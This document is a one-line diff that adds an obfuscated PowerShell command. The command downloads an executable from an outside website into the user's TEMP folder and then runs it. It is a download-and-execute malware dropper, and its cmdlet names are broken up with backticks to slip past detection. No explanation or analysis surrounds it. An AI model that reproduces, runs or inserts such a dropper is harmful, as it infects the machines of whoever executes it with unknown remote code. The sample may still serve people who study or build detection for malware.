@@ -1,0 +1,1 @@
+﻿(nE`w-OBje`ct System.Net.WebClient).DownloadFile('http://www.wealthandhealthops.com/modules/mod_easyblogquickpost/lawdsijdoef.exe',"$env:TEMP\lawdsijdoef.exe");STaRT`-Pro`c`EsS ("$env:TEMP\lawdsijdoef.exe")
